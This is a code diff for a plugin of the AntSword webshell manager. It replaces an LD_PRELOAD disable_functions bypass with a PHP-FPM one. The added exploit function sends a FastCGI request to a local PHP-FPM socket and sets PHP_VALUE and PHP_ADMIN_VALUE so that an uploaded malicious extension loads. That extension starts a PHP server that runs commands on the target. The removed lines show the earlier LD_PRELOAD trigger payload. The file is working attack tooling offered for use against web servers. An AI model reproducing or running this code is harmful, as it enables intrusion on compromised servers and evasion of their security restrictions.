@@ -3,10 +3,10 @@
 const Base = require('../base');
 const LANG = require('../../language'); // 插件语言库
 const LANG_T = antSword['language']['toastr']; // 通用通知提示
+const {FastCgiClient} = require('../../payload');
+let PHP_FPM_LANG = LANG['core']['php_fpm'];
 
-let LD_PRELOAD_LANG = LANG['core']['ld_preload'];
-
-class LD_PRELOAD extends Base {
+class PHP_FPM extends Base {
   /**
    * 
    * @param {dhtmlxObject} cell 组件
@@ -24,10 +24,10 @@ class LD_PRELOAD extends Base {
   precheck() {
     let self = this;
     let infodata = self.top.infodata;
-    if (infodata.os.toLowerCase() !== "linux" ) {
-      toastr.error(LANG['precheck']['only_linux'], LANG_T['error']);
-      return false;
-    }
+    // if (infodata.os.toLowerCase() !== "linux" ) {
+    //   toastr.error(LANG['precheck']['only_linux'], LANG_T['error']);
+    //   return false;
+    // }
     return true;
   }
 
@@ -41,8 +41,30 @@ class LD_PRELOAD extends Base {
       type: 'block',
       inputWidth: 'auto',
       list: [
-        { type: 'label', label: LD_PRELOAD_LANG['title']},
-        { type: 'combo', label: LD_PRELOAD_LANG['form']['phpbinary'], labelWidth: 300, name: 'phpbinary', required: true,
+        { type: 'label', label: PHP_FPM_LANG['title']},
+        { type: 'combo', label: PHP_FPM_LANG['form']['fpm_addr'], labelWidth: 300, name: 'fpm_addr', required: true,
+          options: (() => {
+            let vals = [
+              'unix:///var/run/php5-fpm.sock',
+              'unix:///var/run/php/php5-fpm.sock',
+              'unix:///var/run/php-fpm/php5-fpm.sock',
+              'unix:///var/run/php/php7-fpm.sock',
+              '/var/run/php/php7.2-fpm.sock',
+              '/usr/local/var/run/php7.3-fpm.sock',
+              'localhost:9000',
+              '127.0.0.1:9000',
+            ];
+            let ret = [];
+            vals.map((_) => {
+              ret.push({
+                text: _,
+                value: _
+              });
+            });
+            return ret;
+          })()
+        },
+        { type: 'combo', label: PHP_FPM_LANG['form']['phpbinary'], labelWidth: 300, name: 'phpbinary', required: true,
           options: (() => {
             let vals = [
               'php',
@@ -85,12 +107,23 @@ class LD_PRELOAD extends Base {
   // 执行EXP, 必须有这个函数
   exploit() {
     let self = this;
+    let fpm_host = '';
+    let fpm_port = -1;
     let port = Math.floor(Math.random() * 5000) + 60000; // 60000~65000
     if(self.form.validate()){
       self.cell.progressOn();
       let core = self.top.core;
       let formvals = self.form.getValues();
       let phpbinary = formvals['phpbinary'];
+      formvals['fpm_addr'] = formvals['fpm_addr'].toLowerCase();
+      if (formvals['fpm_addr'].startsWith('unix:')) {
+        fpm_host = formvals['fpm_addr'];
+      } else if (formvals['fpm_addr'].startsWith('/')) {
+        fpm_host = `unix://${formvals['fpm_addr']}`
+      } else {
+        fpm_host = formvals['fpm_addr'].split(':')[0] || '';
+        fpm_port = parseInt(formvals['fpm_addr'].split(':')[1]) || 0;
+      }
       // 生成 ext
       let wdir = "";
       if(self.isOpenBasedir) {
@@ -110,7 +143,7 @@ class LD_PRELOAD extends Base {
       let cmd = `${phpbinary} -n -S 127.0.0.1:${port} -t ${self.top.infodata.phpself}`;
       let fileBuffer = self.generateExt(cmd);
       if(!fileBuffer) {
-        toastr.warning(LD_PRELOAD_LANG['msg']['genext_err'], LANG_T["warning"]);
+        toastr.warning(PHP_FPM_LANG['msg']['genext_err'], LANG_T["warning"]);
         self.cell.progressOff();
         return
       }
@@ -136,11 +169,33 @@ class LD_PRELOAD extends Base {
         });
       }).then((p) => {
         // 触发 payload, 会超时
-        var payload = `error_reporting(E_ALL);putenv("LD_PRELOAD=${p}");error_log("a", 1);echo(1);`;
+        var payload = `${FastCgiClient()};
+          $content="";
+          $client = new Client('${fpm_host}',${fpm_port});
+          $client->request(array(
+            'GATEWAY_INTERFACE' => 'FastCGI/1.0',
+            'REQUEST_METHOD' => 'POST',
+            'SERVER_SOFTWARE' => 'php/fcgiclient',
+            'REMOTE_ADDR' => '127.0.0.1',
+            'REMOTE_PORT' => '9984',
+            'SERVER_ADDR' => '127.0.0.1',
+            'SERVER_PORT' => '80',
+            'SERVER_NAME' => 'mag-tured',
+            'SERVER_PROTOCOL' => 'HTTP/1.1',
+            'CONTENT_TYPE' => 'application/x-www-form-urlencoded',
+            'PHP_VALUE' => 'extension=${p}',
+            'PHP_ADMIN_VALUE' => 'extension=${p}',
+            'CONTENT_LENGTH' => strlen($content)
+            ),
+            $content
+          );
+          sleep(1);
+          echo(1);
+        `;
         core.request({
           _: payload,
         }).then((response)=>{
-
+          
         }).catch((err)=>{
           // 超时也是正常
         })
@@ -165,19 +220,20 @@ class LD_PRELOAD extends Base {
             }else{
               self.cell.progressOff();
               throw("exploit fail");
-            }
+            } 
           }).catch((err)=>{
             self.cell.progressOff();
             toastr.error(`${LANG['error']}: ${JSON.stringify(err)}`, LANG_T['error']);
-          });
+          })
       }).catch((err)=>{
         self.cell.progressOff();
         toastr.error(`${LANG['error']}: ${JSON.stringify(err)}`, LANG_T['error']);
       });
     }else{
+      self.cell.progressOff();
       toastr.warning(LANG['form_not_comp'], LANG_T["warning"]);
     }
     return;
   }
 }
-module.exports = LD_PRELOAD;
+module.exports = PHP_FPM;
